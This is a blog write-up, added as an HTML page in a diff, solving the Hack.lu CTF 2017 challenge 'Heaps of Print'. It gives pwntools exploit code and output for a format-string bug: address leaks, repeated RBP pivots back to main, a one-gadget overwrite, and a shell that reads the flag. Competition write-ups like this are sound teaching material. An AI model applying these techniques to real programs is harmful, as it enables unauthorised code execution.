@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Hack.lu CTF 2017 - Heaps of Print | kileak</title>
+
+
+
+
+
+<meta name="description" content="Hack.lu CTF 2017 - Heaps of Print">
+
+
+<meta name="keywords" content="hacklu">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/HackLu-heapsofprint/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Hack.lu CTF 2017 - Heaps of Print</h1>
+      <p class="post-meta">Oct 20, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>HeapsOfPrint (24 solves)
+<!--break--></p>
+
+  <p>Having studied the works of Professor Flux Horst and becoming more and more adept in different survial techniques, the Sky seems to be closer than ever. In his most recent excercise, Samuel’s objective seems farther away than usual. Can you help him close this gap?</p>
+
+  <p>nc flatearth.fluxfingers.net 1747</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/heapsofprint/HeapsOfPrint">HeapsOfPrint</a> <a href="https://kileak.github.io/assets/heapsofprint/libc.so.6">libc.so.6</a> <a href="https://kileak.github.io/assets/heapsofprint/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<p>The binary represents pretty much your default format string vuln challenge, though it has some strict settings</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Canary                        : Yes 
+NX                            : Yes
+PIE                           : Yes
+Fortify                       : No
+RelRO                         : Full</code></pre></figure>
+
+<p>and it only allows one call to <code class="language-plaintext highlighter-rouge">printf</code>, which might make this a little bit harder than just overwriting some got entries ;)</p>
+
+<p>For some quick reversing</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+
+  <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x400uLL</span><span class="p">);</span>
+  <span class="n">do_this</span><span class="p">();</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">do_this</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">ch</span><span class="p">;</span>
+  
+  <span class="n">ch</span> <span class="o">=</span> <span class="mi">102</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"My favourite character is %c (as in 'flat'). I hope yours as well! Is it?"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ch</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">do_that</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">do_that</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%1023s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Sooo, the format string will be stored on the heap, thus we cannot use our format string for forging addresses on the stack. The <code class="language-plaintext highlighter-rouge">do_this</code> function also leaks the lowest byte from <code class="language-plaintext highlighter-rouge">char ch</code>, which might be used to calculate the offsets on the stack, though I didn’t use this correct. Nevertheless the exploit worked in 2 of 3 cases, so…</p>
+
+<p>One call to <code class="language-plaintext highlighter-rouge">printf</code> will definitely be not enough to pwn this binary, so we should find a way to return to main, so we can do additional <code class="language-plaintext highlighter-rouge">printf</code>s.</p>
+
+<p>Since the binary uses <code class="language-plaintext highlighter-rouge">PIE</code> we aren’t able to know the address of <code class="language-plaintext highlighter-rouge">main</code> or any other address in the binary, but with the 6th format string parameter we are able to overwrite RBP.</p>
+
+<p>Though we don’t know any addresses by now, there will be the address of <code class="language-plaintext highlighter-rouge">_start</code> on the stack. Thus we only have to pivot RBP to the address before that one, and after the <code class="language-plaintext highlighter-rouge">leave; ret</code> at the end of main, it will return to that address, effectively jumping back to main, which enables us to do another <code class="language-plaintext highlighter-rouge">printf</code> :)</p>
+
+<p>In the first step, we should thus do a partial overwrite on RBP, so it will point RSP to the address of <code class="language-plaintext highlighter-rouge">_start</code> and use this initial format string also to leak some other useful addresses from the stack, which we might be able to use in the following stages:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"flatearth.fluxfingers.net"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1747</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>   
+  <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+  <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./HeapsOfPrint"</span><span class="p">)</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak addresses"</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="s">"My favourite character is "</span><span class="p">))</span>
+  <span class="n">LEAKCHAR</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak byte: %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAKCHAR</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
+    
+  <span class="c1"># Overwrite lowest byte of RBP so it'll be pointing to address before _start
+</span>  <span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%%%du%%6$hhn"</span> <span class="o">%</span> <span class="p">(</span><span class="n">LEAKCHAR</span><span class="o">-</span><span class="mh">0x7</span><span class="p">)).</span><span class="n">rjust</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="s">" "</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">+=</span> <span class="s">"%6$p.%7$p.%17$p"</span>
+  
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+
+  <span class="n">STACKLEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"."</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+  <span class="n">PIELEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"."</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+  <span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"My"</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+  <span class="n">PIE</span> <span class="o">=</span> <span class="n">PIELEAK</span> <span class="o">-</span> <span class="mh">0x8f0</span>
+  <span class="n">LIBC</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0x20830</span>
+  <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBC</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"STACK leak      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">STACKLEAK</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIELEAK</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak       : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE base        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span> 
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC            : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./HeapsOfPrint"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+    <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python xpl.py 1
+<span class="o">[</span>+] Opening connection to flatearth.fluxfingers.net on port 1747: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kileak/pwn/Challenges/hacklu/print/libc.so.6'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kileak/pwn/Challenges/hacklu/print/HeapsOfPrint'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak addresses
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak byte: 0xa7
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> STACK leak      : 0x7ffce66590b0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> PIE leak        : 0x5651f9d5e8f0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> LIBC leak       : 0x7f2ed52ee830
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> PIE base        : 0x5651f9d5e000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> LIBC            : 0x7f2ed52ce000</code></pre></figure>
+
+<p>At this point, the binary asks us for another format string, whilst we now have leaks on <code class="language-plaintext highlighter-rouge">STACK</code>, <code class="language-plaintext highlighter-rouge">PIE</code> and <code class="language-plaintext highlighter-rouge">LIBC</code>.</p>
+
+<p>I first tried to get a leak for the heap, so we could put a ropchain there and then just stack pivot to the heap, but didn’t get it to work properly, so I opted for another approach.</p>
+
+<p>When jumping to <code class="language-plaintext highlighter-rouge">_start</code> we’ll be creating new stack frames (going upwards in the stack).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[Stackframe in 4th call]
+[Stackframe in 3rd call]
+[Stackframe in 2nd call]
+[Stackframe in 1st call]</code></pre></figure>
+
+<p>We can leverage this to write values in one stack frame and accessing them from another. We’ll only have to keep in mind, that the offsets for our format string parameters will differ on every stage (+68 from empirical analysis ;-)).</p>
+
+<p>Since we cannot directly write addresses onto the stack, we’ll have to reuse the addresses already there and try to use those, to write arbitrary address onto the stack, which we can then use to write our final values.</p>
+
+<p>In the second stackframe (after we had leaked the addresses), the 13th parameter will contain the value <code class="language-plaintext highlighter-rouge">0x7fffffffee68</code> (ASLR disabled), so we can use that one, to write to the stack address <code class="language-plaintext highlighter-rouge">0x7fffffffee68</code> (which is the content of the 47th parameter). But while we’re writing to that address, we’ll also have to overwrite RBP again, so it will jump back to main again (otherwise the binary would stop after that write).</p>
+
+<p>Since the jump back to main will create a new stack frame (Stackframe 3 now), the offsets for our format string parameters will change, so we cannot access <code class="language-plaintext highlighter-rouge">0x7fffffffee68</code> with the 47th parameter anymore. Like I said, the offsets will also grow by 68 in every stage. This means the value can now be accessed with the 115th parameter.</p>
+
+<p>Let’s use that to write the address of an onegadget onto the stack. To do that, I first searched for an existing libc address on the stack (the higher dword will always be the same, so we’ll only have to overwrite the lower dword).</p>
+
+<p>After some failures due to the stack movement, I found an usable libc address at <code class="language-plaintext highlighter-rouge">STACKLEAK - 0x8c8</code>.</p>
+
+<p>To be able to overwrite that address, we’ll first need an address on the stack, pointing to the address containing this one. Since at <code class="language-plaintext highlighter-rouge">0x7fffffffee68</code> also a stack address is stored, we can use parameter 13 to overwrite the lower word at <code class="language-plaintext highlighter-rouge">0x7fffffffee68</code> with the lower word of the address of our target libc address:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Write pointer to a LIBC address to stack"</span><span class="p">)</span>
+
+<span class="n">LIBCADDR</span> <span class="o">=</span> <span class="n">STACKLEAK</span> <span class="o">-</span> <span class="mh">0x8c8</span>
+<span class="n">LIBCADDR_LO</span> <span class="o">=</span> <span class="n">LIBCADDR</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+
+<span class="n">ONE_HI</span> <span class="o">=</span> <span class="p">(</span><span class="n">ONE</span> <span class="o">&amp;</span> <span class="mh">0xffff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
+<span class="n">ONE_LO</span> <span class="o">=</span> <span class="n">ONE</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+  
+<span class="c1"># Offset, which points to "return to start" address
+</span><span class="n">CURSTACKOFF</span> <span class="o">=</span> <span class="n">STACKLEAK</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>  
+<span class="n">CURSTACKOFF</span> <span class="o">-=</span> <span class="mh">0x120</span>  
+  
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%%%du%%6$hn"</span> <span class="o">%</span> <span class="n">CURSTACKOFF</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%%%du%%13$hn"</span> <span class="o">%</span> <span class="p">(</span><span class="mh">0xffff</span><span class="o">-</span><span class="n">CURSTACKOFF</span><span class="o">+</span><span class="n">LIBCADDR_LO</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># =&gt; 115 now
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>The first line of our payload overwrites RBP to jump back to main, the second line overwrites the lower dword at <code class="language-plaintext highlighter-rouge">0x7fffffffee68</code> with the calculated address, where the libc address is stored.</p>
+
+<p>After this, another stack frame is created, and we jump back into main. We can now use parameter 115 to use our forged address to write to that address.</p>
+
+<p>We’ll be using it to write the lower word of the onegadget address there:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># Overwrite last word of LIBC address
+</span><span class="n">CURSTACKOFF</span> <span class="o">-=</span> <span class="mh">0x110</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%%%du%%6$hn"</span> <span class="o">%</span> <span class="n">CURSTACKOFF</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%%%du%%115$hn"</span> <span class="o">%</span> <span class="p">(</span><span class="mh">0xffff</span><span class="o">-</span><span class="n">CURSTACKOFF</span><span class="o">+</span><span class="n">ONE_LO</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>  
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Thus we have successfully overwritten the lower word at that address with the lower word of onegadget.</p>
+
+<p>For overwriting the next word we’ll need another pointer, pointing to that address, so we use the 13th parameter again to overwrite the address at <code class="language-plaintext highlighter-rouge">0x7fffffffee68</code> again, but this time pointing to LIBCADDR+2.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># Overwrite LIBC address + 2
+</span><span class="n">CURSTACKOFF</span> <span class="o">-=</span> <span class="mh">0x110</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%%%du%%6$hn"</span> <span class="o">%</span> <span class="n">CURSTACKOFF</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%%%du%%13$hn"</span> <span class="o">%</span> <span class="p">(</span><span class="mh">0xffff</span><span class="o">-</span><span class="n">CURSTACKOFF</span><span class="o">+</span><span class="n">LIBCADDR_LO</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># =&gt; 183 now
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Again, the format string parameter pointing to that address is increased by 68, so it will now be the 183th parameter, by which we can access this new stack pointer.</p>
+
+<p>Thus, we’ll use it to overwrite the next word in our libc address.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># Overwrite next word of libc address
+</span><span class="n">CURSTACKOFF</span> <span class="o">-=</span> <span class="mh">0x110</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%%%du%%6$hn"</span> <span class="o">%</span> <span class="n">CURSTACKOFF</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%%%du%%183$hn"</span> <span class="o">%</span> <span class="p">(</span><span class="mh">0xffff</span><span class="o">-</span><span class="n">CURSTACKOFF</span><span class="o">+</span><span class="n">ONE_HI</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>      
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Finally we now have the complete address to our onegadget on the stack, so it might be time to stack pivot to it and get a shell.</p>
+
+<p>But at this time, I didn’t find any onegadget, whose constraints I could fulfill, since the stack was always full of garbage, preventing the onegadget to execute (garbage in argv or envp).</p>
+
+<p>So I decided to clean up the stack with some additional format strings.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>one_gadget libc.so.6 
+
+0x4526a execve<span class="o">(</span><span class="s2">"/bin/sh"</span>, rsp+0x30, environ<span class="o">)</span>
+constraints:
+<span class="o">[</span>rsp+0x30] <span class="o">==</span> NULL</code></pre></figure>
+
+<p>Ok, so we’d just need to clear up the value, which will be at <code class="language-plaintext highlighter-rouge">rsp+0x30</code> in our final stackframe.</p>
+
+<p>Again, we’ll first do a partial overwrite to the existing stack address in format string parameter 13, let it point to the value on the stack (which will be <code class="language-plaintext highlighter-rouge">rsp+0x30</code>) and then do another format string to overwrite it with a <code class="language-plaintext highlighter-rouge">null</code> value.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span> <span class="p">(</span><span class="s">"Cleanup stack (set RSP+0x30 = null)"</span><span class="p">)</span>
+  
+<span class="n">CURSTACKOFF</span> <span class="o">-=</span> <span class="mh">0x110</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%%%du%%6$hn"</span> <span class="o">%</span> <span class="n">CURSTACKOFF</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%%%du%%13$hn"</span> <span class="o">%</span> <span class="p">(</span><span class="mh">0xffff</span><span class="o">-</span><span class="n">CURSTACKOFF</span><span class="o">+</span><span class="n">LIBCADDR_LO</span><span class="o">+</span><span class="mh">0x38</span><span class="p">)</span> <span class="c1"># =&gt; 251 now
+</span>  
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+<span class="n">CURSTACKOFF</span> <span class="o">-=</span> <span class="mh">0x110</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="s">"%%%du%%6$hn"</span> <span class="o">%</span> <span class="n">CURSTACKOFF</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%%%du%%251$hn"</span> <span class="o">%</span> <span class="p">(</span><span class="mh">0xffff</span><span class="o">-</span><span class="n">CURSTACKOFF</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> 
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>So, now all preconditions for our onegadget should be met, and we’re ready to stack pivot there, by doing a final overwrite of <code class="language-plaintext highlighter-rouge">RBP</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Stack pivot to onegadget address"</span><span class="p">)</span>
+
+<span class="n">TARGET</span> <span class="o">=</span> <span class="n">STACKLEAK</span> <span class="o">-</span> <span class="mh">0x8c8</span> <span class="o">-</span> <span class="mi">8</span>
+<span class="n">TARGET</span> <span class="o">=</span> <span class="n">TARGET</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"%%%du%%6$hn"</span> <span class="o">%</span> <span class="n">TARGET</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>resulting in</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python xpl.py 1
+<span class="o">[</span>+] Opening connection to flatearth.fluxfingers.net on port 1747: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kileak/pwn/Challenges/hacklu/print/libc.so.6'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kileak/pwn/Challenges/hacklu/print/HeapsOfPrint'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak addresses
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leak byte: 0xa7
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> STACK leak      : 0x7ffce66590b0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> PIE leak        : 0x5651f9d5e8f0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> LIBC leak       : 0x7f2ed52ee830
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> PIE base        : 0x5651f9d5e000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> LIBC            : 0x7f2ed52ce000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> HEAP address    : 0x7ffce66587e8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ONE gadget      : 0x7f2ed531326a
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Paused <span class="o">(</span>press any to <span class="k">continue</span><span class="o">)</span>
+
+<span class="o">[</span>... Lots of <span class="nb">printf </span>trash and interactive breaks <span class="p">;</span><span class="o">)]</span>
+
+1<span class="nv">$ </span><span class="nb">ls
+</span>flag
+HeapsOfPrint
+setup.sh
+<span class="nv">$ </span><span class="nb">cat </span>flag
+FLAG<span class="o">{</span>dr4w1ng_st4ckfr4m3s_f0r_fun_4nd_pr0f1t<span class="o">}</span></code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=Hack.lu CTF 2017 - Heaps of Print&amp;url=https://kileak.github.io/ctf/2017/HackLu-heapsofprint/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/HackLu-heapsofprint/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/HackLu-heapsofprint';
+        var disqus_title = 'Hack.lu CTF 2017 - Heaps of Print';
